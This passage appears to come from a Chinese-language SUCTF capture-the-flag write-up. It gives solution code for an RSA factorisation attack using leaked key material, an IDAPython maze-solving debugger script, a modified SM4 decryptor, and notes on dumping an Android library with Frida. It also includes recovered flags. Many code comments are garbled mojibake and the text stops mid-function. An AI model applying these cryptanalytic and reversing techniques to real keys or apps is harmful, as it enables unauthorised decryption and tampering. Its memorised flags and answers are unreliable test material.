sh.recvuntil(b'give me your msg ->')
sh.sendline(msg.encode())
sh.recvline()
sh.recvline()
sh.interactive() # SUCTF{5imple_st4te_Tran3fer_w1th_s1m1lar_to_md5!!!!!}

SU_rsa

根据k = (e*d_m) // n + 1计算准确的k，根据这篇论文中的3-1部分进行攻击。但问题是在计算p的高位时，一位都对不上。

于是我仅仅用了Step3这个步骤求出p % e，其值大概有256bit，然后可以用已知p低位恢复p的思路进行恢复。自己测试的时候发现在这种情况下，e如果是270bit(相当于有p的低270bit)，可以用copper直接恢复，所以我用上32线程爆破14bit

7分钟即可得解

“

exp.py

from tqdm import trange
from Crypto.Util.number import inverse
from multiprocessing import Pool
from hashlib import sha256
import gmpy2

d_m =  54846367460362174332079522877510670032871200032162046677317492493462931044216323394426650814743565762481796045534803612751698364585822047676578654787832771646295054609274740117061370718708622855577527177104905114099420613343527343145928755498638387667064228376160623881856439218281811203793522182599504560128
n =  102371500687797342407596664857291734254917985018214775746292433509077140372871717687125679767929573899320192533126974567980143105445007878861163511159294802350697707435107548927953839625147773016776671583898492755338444338394630801056367836711191009369960379855825277626760709076218114602209903833128735441623
e =  112238903025225752449505695131644979150784442753977451850362059850426421356123

# 计算 k
k = (e*d_m) // n + 1

# 计算p mod e的值
k_inv = inverse(k,e)
s = (n + 1 + k_inv) % e
R.<x> = PolynomialRing(Zmod(e))
f = x^2 - s*x + n
res = f.roots()
may_p_mod_e = [int(res[0][0]),int(res[1][0])]

def attack(range):
    low = range[0]
    up = range[1]
    for pl in may_p_mod_e:
        R.<x> = PolynomialRing(Zmod(n))
        for i in trange(low,up):
            f = (x * 2^14 + i) * e + pl
            res = f.monic().small_roots(X=2^242,beta=0.49,epsilon=0.02)
            if res != []:
                print(f"res = {res}")
                print(f"i = {i}")
            for root in res:
                p = (int(root) * 2^14 + i) * e + pl
                if n % p == 0:
                    flag1 = "SUCTF{" + sha256(str(p).encode()).hexdigest()[:32] + "}"
                    flag2 = "SUCTF{" + sha256(str(n // p).encode()).hexdigest()[:32] + "}"
                    print(flag1)
                    print(flag2)
                    return 
                
ranges = [(i,i + 512) for i in range(0,2^14,512)]

with Pool(32) as pool:  
    r = list(pool.imap(attack,ranges))

Reverse

SU_mapmap2

分析可知输入为268字符的路径,只允许wasd这四个字符,题目给定了初始和最终状态

之后循环取字符,计算当前状态向指定方向移动后的状态, 如果合法则状态变化,如果不合法则回到初始状态

可以简化为一个状态机的DFS,平常走迷宫以坐标为一个单位,此处以状态为一个单位

由于每次失败会回到原点,所以可以使用idapython自动动调并进行DFS操作

首先在for循环计数器改变后马上下断点,此时已经计算出新的状态,便于提取

脚本如下

from idaapi import *

origin_status=get_qword(0x63F530)
final_status=get_qword(0x63F538)

# 获取相关数据的地址 
rbp=get_reg_val('rbp')
input_addr=rbp-0x40
i_addr=rbp-0x48
status_addr=rbp-0x50
path=get_qword(input_addr)
# 路径数组
flag=''
isVisited=dict()
# 存储状态被访问的情况,防止走回头路

def get_status():
    return get_qword(status_addr)

def set_status(status):
    patch_qword(status_addr,status)

def get_i():
    return get_qword(i_addr)
def set_i(i):
    patch_qword(i_addr,i)

def get_code(pos):
    return get_byte(path+pos)

def set_code(off,code):
    patch_byte(path+off,ord(code))

# 判断指定状态向指定方向移动后的状态
def run_is_legal(status, code):
    # 设置初始状态
    set_status(status)
    set_code(0,code)
    set_i(0) # 无限循环

    # 运行,获取新状态
    continue_process()
    wait_for_next_event(WFNE_SUSP,-1)
# 等待下一个调试事件
    new_status=get_status()
# 获取新的状态
    
    print(f'code:{code} new_status:{hex(new_status)}')
    return new_status

# 搜索指定状态的路径,DFS深搜
def search(status):
    global flag
    global isVisited
    print("search status:",hex(status))
    if status==final_status:
        return True
    if status in isVisited:
        return False
    else:
        isVisited[status]=True

    new_status=run_is_legal(status, 'w')
    if new_status!=origin_status and new_status!=status:
        if search(new_status):
            flag+='w'
            return True

    new_status=run_is_legal(status, 'd')
    if new_status!=origin_status and new_status!=status:
        if search(new_status):
            flag+='d'
            return True

    new_status=run_is_legal(status, 's')
    if new_status!=origin_status and new_status!=status:
        if search(new_status):
            flag+='s'
            return True

    new_status=run_is_legal(status, 'a')
    if new_status!=origin_status and new_status!=status:
        if search(new_status):
            flag+='a'
            return True
    return False

print(f'original status:{hex(origin_status)},final_status:{hex(final_status)}')
search(origin_status)
print("flag:",flag[::-1])
# 递归需要倒序flag才是正确结果

拿到路径后md5嗦一下即可

ddssaassddddssddssssaassaawwwwwwaassssssssssddssssssddwwddddssssddssssddwwwwddssddwwddssddwwwwwwwwwwaawwaawwddwwaaaawwwwddwwddssddddddssaassaassddssddwwddwwwwwwwwwwwwddssssssssssddddssssssddwwwwwwddssddssaassssddssssaaaawwwwaassssaawwaassssssddddssssddssssssaassdddddd

SU_vm_master

一个虚拟机实现的SM4加密算法 其中进行了一些魔改

输入一段字符串进行Trace   主要观察与或非异或这几个逻辑运算

不断调试  发现以下函数经过的修改

void four_uCh2uLong(u8 *in, u32 *out);             //锟斤拷锟街斤拷转锟斤拷锟斤拷u32
void uLong2four_uCh(u32 in, u8 *out);   

找出所有魔改的地方后    可以从内存中看到对应的IV以及密钥

求解即可

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define u8 unsigned char
#define u32 unsigned long

void four_uCh2uLong(u8 *in, u32 *out);             //锟斤拷锟街斤拷转锟斤拷锟斤拷u32

void uLong2four_uCh(u32 in, u8 *out);              //u32转锟斤拷锟斤拷锟斤拷锟街斤拷

unsigned long move(u32 data, int length);          //锟斤拷锟狡ｏ拷锟斤拷锟斤拷锟斤拷锟斤拷位锟斤拷锟斤拷尾锟斤拷

unsigned long func_key(u32 input);                 //锟斤拷使锟斤拷Sbox锟斤拷锟叫凤拷锟斤拷锟皆变化锟斤拷锟劫斤拷锟斤拷锟皆变换L锟矫伙拷为L'

unsigned long func_data(u32 input);                //锟斤拷使锟斤拷Sbox锟斤拷锟叫凤拷锟斤拷锟皆变化锟斤拷锟劫斤拷锟斤拷锟斤拷锟皆变换L

void print_hex(u8 *data, int len);                 //锟睫凤拷锟斤拷锟街凤拷锟斤拷锟斤拷转16锟斤拷锟狡达拷印

void encode_fun(u8 len,u8 *key, u8 *input, u8 *output);   //锟斤拷锟杰猴拷锟斤拷

void decode_fun(u8 len,u8 *key, u8 *input, u8 *output);   //锟斤拷锟杰猴拷锟斤拷

/******************************锟斤拷锟斤拷系统锟斤拷锟斤拷FK锟斤拷取值****************************************/
const u32 TBL_SYS_PARAMS[4] = {
    0xa3b1bac6,
    0x56aa3350,
    0x677d9197,
    0xb27022dc
};

/******************************锟斤拷锟斤拷潭锟斤拷锟斤拷锟紺K锟斤拷取值****************************************/
const u32 TBL_FIX_PARAMS[32] = {

    0x00070e15,0x1c232a31,0x383f464d,0x545b6269,
    0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,
    0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,
    0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,
    0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,
    0x30373e45,0x4c535a61,0x686f767d,0x848b9299,
    0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,
    0x10171e25,0x2c333a41,0x484f565d,0x646b7279
};

/******************************SBox锟斤拷锟斤拷锟叫憋拷****************************************/
const u8 TBL_SBOX[256] = {

    0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,
    0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,
    0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,
    0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,
    0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,
    0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,
    0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,
    0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,
    0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,
    0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,
    0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,
    0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,
    0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,
    0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,
    0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,
    0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48
};

void four_uCh2uLong1(u8 *in, u32 *out)
{
    int i = 0;
    *out = 0;
    for (i = 0; i < 4; i++)
        *out = ((u32)in[i] << (24 - i * 8)) ^ *out;
    //*out = (*out>>8)|(*out<<32-8);
}

void uLong2four_uCh1(u32 in, u8 *out)
{
    int i = 0;
    //浠?2浣島nsigned long鐨勯珮浣嶅紑濮嬪彇
    for (i = 0; i < 4; i++)
        *(out + i) = (u32)(in >> (24 - i * 8));
    //u8 tmp = out[0];
    //for (i = 0; i < 4; i++)
    //    *(out + i) = *(out + (i+1)%4);
    //out[3] = tmp;
}

void four_uCh2uLong(u8 *in, u32 *out)
{
    int i = 0;
    *out = 0;
    for (i = 0; i < 4; i++)
        *out = ((u32)in[i] << (24 - i * 8)) ^ *out;
    *out = (*out>>8)|(*out<<32-8);
}

void uLong2four_uCh(u32 in, u8 *out)
{
    int i = 0;
    //浠?2浣島nsigned long鐨勯珮浣嶅紑濮嬪彇
    for (i = 0; i < 4; i++)
        *(out + i) = (u32)(in >> (24 - i * 8));
    u8 tmp = out[0];
    for (i = 0; i < 4; i++)
        *(out + i) = *(out + (i+1)%4);
    out[3] = tmp;
}

//锟斤拷锟狡ｏ拷锟斤拷锟斤拷锟斤拷锟斤拷位锟斤拷锟斤拷尾锟斤拷
u32 move(u32 data, int length)
{
    u32 result = 0;
    result = (data << length) ^ (data >> (32 - length));

    return result;
}

//锟斤拷钥锟斤拷锟斤拷锟斤拷锟斤拷,锟斤拷使锟斤拷Sbox锟斤拷锟叫凤拷锟斤拷锟皆变化锟斤拷锟劫斤拷锟斤拷锟皆变换L锟矫伙拷为L'
u32 func_key(u32 input)
{
    int i = 0;
    u32 ulTmp = 0;
    u8 ucIndexList[4] = { 0 };
    u8 ucSboxValueList[4] = { 0 };
    uLong2four_uCh(input, ucIndexList);
    for (i = 0; i < 4; i++)
    {
        ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];
    }
    four_uCh2uLong(ucSboxValueList, &ulTmp);
    ulTmp = ulTmp ^ move(ulTmp, 13) ^ move(ulTmp, 23);

    return ulTmp;
}

//锟接斤拷锟斤拷锟斤拷锟捷达拷锟斤拷锟斤拷锟斤拷,锟斤拷使锟斤拷Sbox锟斤拷锟叫凤拷锟斤拷锟皆变化锟斤拷锟劫斤拷锟斤拷锟斤拷锟皆变换L
u32 func_data(u32 input)
{
    int i = 0;
    u32 ulTmp = 0;
    u8 ucIndexList[4] = { 0 };
    u8 ucSboxValueList[4] = { 0 };
    printf("niinput: %xn",input);
    uLong2four_uCh(input, ucIndexList);
    for (i = 0; i < 4; i++)
    {
        ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];
        
    }
    four_uCh2uLong(ucSboxValueList, &ulTmp);
    printf("nulTmp1: %xn",ulTmp);
    ulTmp = ulTmp ^ move(ulTmp, 2) ^ move(ulTmp, 10) ^ move(ulTmp, 18) ^ move(ulTmp, 24);
    printf("nulTmp2: %xn",ulTmp);
    return ulTmp;
}

//锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟皆硷拷锟斤拷锟斤拷锟解长锟斤拷锟斤拷锟捷ｏ拷16锟街斤拷为一锟斤拷循锟斤拷锟斤拷锟斤拷锟姐部锟街诧拷0锟斤拷锟斤拷16锟街节碉拷锟斤拷锟斤拷锟斤拷锟斤拷
//len:
锟斤拷锟捷筹拷锟斤拷(锟斤拷锟解长锟斤拷锟斤拷锟斤拷) key:
锟斤拷钥锟斤拷16锟街节ｏ拷 input:
锟斤拷锟斤拷锟皆硷拷锟斤拷锟?output:
锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟?
void encode_fun(u8 len,u8 *key, u8 *input, u8 *output)
{
    int i = 0,j=0; 
    u8 *p = (u8 *)malloc(50);      //锟斤拷锟斤拷一锟斤拷50锟街节伙拷锟斤拷锟斤拷
    u32 ulKeyTmpList[4] = { 0 };   //锟芥储锟斤拷钥锟斤拷u32锟斤拷锟斤拷
    u32 ulKeyList[36] = { 0 };     //锟斤拷锟斤拷锟斤拷钥锟斤拷展锟姐法锟斤拷系统锟斤拷锟斤拷FK锟斤拷锟斤拷锟侥斤拷锟斤拷娲?
    u32 ulDataList[36] = { 0 };    //锟斤拷锟节达拷偶锟斤拷锟斤拷锟斤拷锟?

    /***************************锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷钥********************************************/
    four_uCh2uLong(key, &(ulKeyTmpList[0]));
    four_uCh2uLong(key + 4, &(ulKeyTmpList[1]));
    four_uCh2uLong(key + 8, &(ulKeyTmpList[2]));
    four_uCh2uLong(key + 12, &(ulKeyTmpList[3]));

    for(i=0;i<4;i++)
    {
        printf("0x%x ",ulKeyTmpList[i]);
        
    }
    
    
    ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0];
    ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1];
    ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2];
    ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3];
    printf("n ulKeyList n");
    for (i = 0; i < 32; i++)             //32锟斤拷循锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷
    {
        //5-36为32锟斤拷锟斤拷锟斤拷钥
        ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]);
        printf("%xn",ulKeyList[i + 4]);
    }
    
    /***********************************锟斤拷锟斤拷32锟斤拷32位锟斤拷锟斤拷锟斤拷钥锟斤拷锟斤拷**********************************/

    for (i = 0; i < len; i++)        //锟斤拷锟斤拷锟斤拷锟斤拷锟捷达拷锟斤拷锟絧锟斤拷锟斤拷锟斤拷
        *(p + i) = *(input + i);
    for (i = 0; i < 16-len % 16; i++)//锟斤拷锟斤拷锟斤拷16位锟斤拷0锟斤拷锟斤拷16锟斤拷锟斤拷锟斤拷锟斤拷
        *(p + len + i) = 0;
    
    for (j = 0; j < len / 16 + ((len % 16) ? 1:0); j++)  //锟斤拷锟斤拷循锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟杰猴拷锟斤拷锟捷憋拷锟芥（锟斤拷锟皆匡拷锟斤拷锟剿达拷锟斤拷锟斤拷16锟街斤拷为一锟轿硷拷锟杰ｏ拷锟斤拷锟斤拷循锟斤拷锟斤拷锟斤拷锟斤拷16锟街斤拷锟斤拷锟斤拷锟揭伙拷危锟?7锟街节诧拷0锟斤拷32锟街节猴拷锟斤拷屑锟斤拷锟斤拷锟斤拷危锟斤拷源锟斤拷锟斤拷疲锟?
    {
        
        /*锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷*/
        four_uCh2uLong(p + 16 * j, &(ulDataList[0]));
        four_uCh2uLong(p + 16 * j + 4, &(ulDataList[1]));
        four_uCh2uLong(p + 16 * j + 8, &(ulDataList[2]));
        four_uCh2uLong(p + 16 * j + 12, &(ulDataList[3]));
        printf("n input data n");
        for(i=0;i<4;i++)
        {
        printf("0x%x ",ulDataList[i]);
        
        }    
        printf("n"); 
        printf("n ulDataList n");
        //锟斤拷锟斤拷
        for (i = 0; i < 32; i++)
        {
            printf("n  0x%x 0x%x 0x%x 0x%x  n",ulDataList[i + 1] ,ulDataList[i + 2] , ulDataList[i + 3] , ulKeyList[i + 4]);
            ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[i + 4]);
            printf("result:  %xn",ulDataList[i + 4] );
            ulDataList[i + 4] ^= 0xdeadbeef;
            printf("xor result:  %xn",ulDataList[i + 4] );
        }
        /*锟斤拷锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟?/
        uLong2four_uCh(ulDataList[35], output + 16 * j);
        uLong2four_uCh(ulDataList[34], output + 16 * j + 4);
        uLong2four_uCh(ulDataList[33], output + 16 * j + 8);
        uLong2four_uCh(ulDataList[32], output + 16 * j + 12);
        printf("n"); 
 
        
    }
    free(p);
}

//锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟斤拷芎锟斤拷锟斤拷锟斤拷锟揭伙拷拢锟街伙拷锟斤拷锟皆渴癸拷玫锟剿筹拷锟酵拷锟斤拷锟斤拷锟皆匡拷追锟斤拷锟斤拷镁锟斤拷墙锟斤拷埽锟?
//len:
锟斤拷锟捷筹拷锟斤拷 key:
锟斤拷钥 input:
锟斤拷锟斤拷募锟斤拷芎锟斤拷锟斤拷锟?output:
锟斤拷锟斤拷慕锟斤拷芎锟斤拷锟斤拷锟?
void decode_fun(u8 len,u8 *key, u8 *input, u8 *output)
{
    int i = 0,j=0;
    u32 ulKeyTmpList[4] = { 0 };//锟芥储锟斤拷钥锟斤拷u32锟斤拷锟斤拷
    u32 ulKeyList[36] = { 0 };  //锟斤拷锟斤拷锟斤拷钥锟斤拷展锟姐法锟斤拷系统锟斤拷锟斤拷FK锟斤拷锟斤拷锟侥斤拷锟斤拷娲?
    u32 ulDataList[36] = { 0 }; //锟斤拷锟节达拷偶锟斤拷锟斤拷锟斤拷锟?

    /*锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷钥*/
    four_uCh2uLong(key, &(ulKeyTmpList[0]));
    four_uCh2uLong(key + 4, &(ulKeyTmpList[1]));
    four_uCh2uLong(key + 8, &(ulKeyTmpList[2]));
    four_uCh2uLong(key + 12, &(ulKeyTmpList[3]));
    
    ulKeyList[0] = ulKeyTmpList[0] ^ TBL_SYS_PARAMS[0];
    ulKeyList[1] = ulKeyTmpList[1] ^ TBL_SYS_PARAMS[1];
    ulKeyList[2] = ulKeyTmpList[2] ^ TBL_SYS_PARAMS[2];
    ulKeyList[3] = ulKeyTmpList[3] ^ TBL_SYS_PARAMS[3];

    for (i = 0; i < 32; i++)             //32锟斤拷循锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷
    {
        //ulDataList[i + 4] ^= 0xdeadbeef;
        //5-36为32锟斤拷锟斤拷锟斤拷钥
        
        ulKeyList[i + 4] = ulKeyList[i] ^ func_key(ulKeyList[i + 1] ^ ulKeyList[i + 2] ^ ulKeyList[i + 3] ^ TBL_FIX_PARAMS[i]);
    
    }
    /*锟斤拷锟斤拷32锟斤拷32位锟斤拷锟斤拷锟斤拷钥锟斤拷锟斤拷*/

    for (j = 0; j < len / 16; j++)  //锟斤拷锟斤拷循锟斤拷锟斤拷锟斤拷,锟斤拷锟斤拷锟斤拷锟杰猴拷锟斤拷锟捷憋拷锟斤拷
    {
        /*锟斤拷始锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷*/
        four_uCh2uLong(input + 16 * j, &(ulDataList[0]));
        four_uCh2uLong(input + 16 * j + 4, &(ulDataList[1]));
        four_uCh2uLong(input + 16 * j + 8, &(ulDataList[2]));
        four_uCh2uLong(input + 16 * j + 12, &(ulDataList[3]));

        //锟斤拷锟斤拷
        for (i = 0; i < 32; i++)
        {
            ulDataList[i + 4] = ulDataList[i] ^ func_data(ulDataList[i + 1] ^ ulDataList[i + 2] ^ ulDataList[i + 3] ^ ulKeyList[35 - i])^ 0xdeadbeef;//锟斤拷锟斤拷锟轿ㄒ伙拷锟酵拷木锟斤拷锟斤拷锟斤拷锟皆匡拷锟绞癸拷锟剿筹拷锟?
        }
        /*锟斤拷锟斤拷锟杰猴拷锟斤拷锟斤拷锟斤拷锟?/
        uLong2four_uCh(ulDataList[35], output + 16 * j);
        uLong2four_uCh(ulDataList[34], output + 16 * j + 4);
        uLong2four_uCh(ulDataList[33], output + 16 * j + 8);
        uLong2four_uCh(ulDataList[32], output + 16 * j + 12);
    }
}

//锟睫凤拷锟斤拷锟街凤拷锟斤拷锟斤拷转16锟斤拷锟狡达拷印
void print_hex(u8 *data, int len)
{
    int i = 0;
    char alTmp[16] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };
    for (i = 0; i < len; i++)
    {
        printf("%c", alTmp[data[i] / 16]);
        printf("%c", alTmp[data[i] % 16]);
        putchar(' ');
    }
    putchar('n');
}
/*锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷实锟斤拷锟斤拷锟斤拷锟街节硷拷锟斤拷锟斤拷锟斤拷埽锟斤拷锟斤拷医锟斤拷锟斤拷确*/
int main(void)
{
    u8 i,len;
    u8 encode_Result[50] = { 0 };    //锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷
    u8 decode_Result[50] = { 0 };    //锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷锟斤拷
    u8 key[16] = "somethingverybad";       //锟斤拷锟斤拷16锟街节碉拷锟斤拷钥
    u8 iv[16] = "somethingnotgood";
    u8 Data_plain[16] = { 0x62,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,0x61,};//锟斤拷锟斤拷16锟街节碉拷原始锟斤拷锟斤拷锟斤拷锟捷ｏ拷锟斤拷锟斤拷锟矫ｏ拷
    len = 16 * (sizeof(Data_plain) / 16) + 16 * ((sizeof(Data_plain) % 16) ? 1 : 0);
    /*
    for(i =0 ;i<16;i++)
    {
        Data_plain[i]^=iv[i];
    }
    encode_fun(sizeof(Data_plain),key, Data_plain, encode_Result);
    for( i=0;i<16;i++)
    {
        printf("0x%x ",encode_Result[i]);
    }
    
    
    decode_fun(len,key, encode_Result, decode_Result);     
    
    printf("decrypt:n");
    printf("key %sn",key); 
    for (i = 0; i < len; i++)
        printf("%x ", (*(decode_Result + i))^=iv[i]);
    */
    u8 ccc1[32] = {  0xF0, 0xA8, 0xBC, 0x50, 0xD9, 0x3A, 0xF7, 0xCE, 0x49, 0x28, 
  0xEA, 0x77, 0x33, 0xB4, 0x17, 0xB0, 0x8E, 0xB9, 0xA5, 0xAD, 
  0xD2, 0x72, 0xDE, 0x2F, 0x46, 0x72, 0xF2, 0x4C, 0x6D, 0x41, 
  0x34, 0x38};
    u8 ccc[32] = {  0xF0, 0xA8, 0xBC, 0x50, 0xD9, 0x3A, 0xF7, 0xCE, 0x49, 0x28, 
  0xEA, 0x77, 0x33, 0xB4, 0x17, 0xB0, 0x8E, 0xB9, 0xA5, 0xAD, 
  0xD2, 0x72, 0xDE, 0x2F, 0x46, 0x72, 0xF2, 0x4C, 0x6D, 0x41, 
  0x34, 0x38};
   u8 flag[32];
   
   decode_fun(16,key, ccc, flag);
   for (i = 0; i < 16; i++)
        printf("%c", (*(flag+ i))^=iv[i]);
    decode_fun(16,key, &ccc[16], &flag[16]);
    for (i = 0; i < 16; i++)
        printf("%c", (*(flag+ i+16))^=ccc[i]);
    return 0;
}

SUAPP

写frida脚本把修改后的so库dump出来

并且把文件头修复一下

然后使用fix-so工具修复so文件之后逆向

核心思路是利用rc4的算法生成伪随机数  然后根据伪随机数在函数列表中取函数以及参数执行加密操作

可以写idapy脚本将所有函数dump下来  最后使用Z3约束求解即可

cin = 'a'*32
print(cin)
ii,jj = 0,0
tt =0 
sbox=[0xd4,0x72,0xab,0x2a,0x46,0x5f,0xf8,0xc3,0x96,0xd6,0x32,0xd7,0x3d,0x69,0xd9,0x64,0xe1,0x65,0x41,0x24,0x3,0xd8,0x5c,0xec,0x7c,0x73,0xc4,0x43,0x8d,0x26,0x68,0xdc,0x3f,0x2c,0xe5,0x39,0x6b,0x4d,0x21,0xf4,0x4e,0x85,0xdd,0x13,0x8e,0xb4,0x3a,0x11,0xd0,0xf9,0xf3,0x9e,0xd1,0x5d,0x37,0x61,0x95,0xea,0x5b,0x99,0x9c,0xb3,0x7,0x2e,0x4,0xf,0x89,0x57,0x5a,0xa7,0x4f,0x82,0x76,0xa0,0xe6,0x63,0xf1,0x15,0x3e,0x1b,0xfd,0xc7,0xa8,0x31,0x6a,0xc6,0x8b,0xd5,0x59,0x6d,0xe9,0x87,0x74,0x5,0x1e,0xb1,0x97,0xa,0xce,0x52,0xb9,0x8f,0xe7,0xac,0x8,0xa6,0x16,0xc2,0xf2,0x42,0x9a,0xfa,0xe2,0x86,0x53,0xff,0x55,0x23,0x71,0xb6,0x44,0xbd,0x8a,0xb2,0x28,0x54,0xc8,0xf0,0x7a,0x90,0xa4,0x7d,0xd3,0xdb,0x1a,0x22,0x20,0xb5,0x83,0xb0,0xa1,0xa5,0x84,0xb7,0x6,0x70,0xaa,0xbc,0xda,0x4b,0x34,0x67,0xd2,0x60,0x0,0xc5,0xd,0x56,0xa3,0x98,0x2d,0x7f,0x1d,0x3b,0xaf,0xe3,0x7b,0x93,0x7e,0x6f,0x6c,0xa9,0x36,0xde,0xbe,0xc9,0x2,0x48,0x8c,0xe8,0xfe,0x62,0x3c,0xca,0x33,0xfc,0xdf,0xee,0x40,0xf5,0xcb,0x47,0x79,0xb,0x2b,0x29,0x94,0xcd,0xba,0x51,0xae,0x58,0x12,0x14,0x88,0xeb,0x9b,0x77,0x1c,0x27,0xe0,0x4c,0x38,0x91,0x49,0xcc,0xa2,0xc1,0x25,0xcf,0xf7,0x9d,0x2f,0xc0,0x45,0x17,0x35,0x92,0x9f,0x4a,0x78,0x66,0xf6,0x5e,0xfb,0xbb,0x10,0x81,0x1,0xe,0x6e,0x9,0xb8,0x18,0x50,0xad,0xe4,0x30,0x80,0x75,0xef,0xed,0x19,0xbf,0xc,0x1f]

def  a224(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a264(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  a2b0(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a2f0(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  a33c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a370(a1, a2, a3, a4,  a5):
  return ((a1 + a3 + a4) ^ a5) + a2
def  a3bc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  a3fc(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  a43c(a1, a2, a3,  a4):
  return (a1 ^ a3 ^ a4) + a2
def  a47c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a4b0(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a4e4(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a524(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a564(a1, a2, a3,  a4):
  return ((a1 + a3) ^ a4) + a2
def  a5a4(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a5d8(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a618(a1, a2, a3):
  return (a1 + a3 + a2)
def  a64c(a1, a2, a3):
  return (a1 + a3 + a2)
def  a680(a1, a2, a3, a4, a5):
  return (a1 ^ a3 ^ (a4 + a5)) + a2
def  a6cc(a1, a2, a3):
  return (a1 + a3 + a2)
def  a700(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  a74c(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a78c(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a7c0(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a7f4(a1, a2, a3, a4, a5):
  return (a1 + a3 + a4 + a5 + a2)
def  a840(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a874(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a8b4(a1, a2, a3, a4, a5):
  return (a1 ^ (a3 + a4 + a5)) + a2
def  a900(a1, a2, a3, a4):
  return (a1 + a3 + a4 + a2)
def  a940(a1, a2, a3, a4):
  return (a1 ^ (a3 + a4)) + a2
def  a980(a1, a2, a3):
  return (a1 + a3 + a2)
def  a9b4(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  a9e8(a1, a2,  a3):
  return (a1 ^ a3) + a2
def  aa1c(a1, a2,  a3):
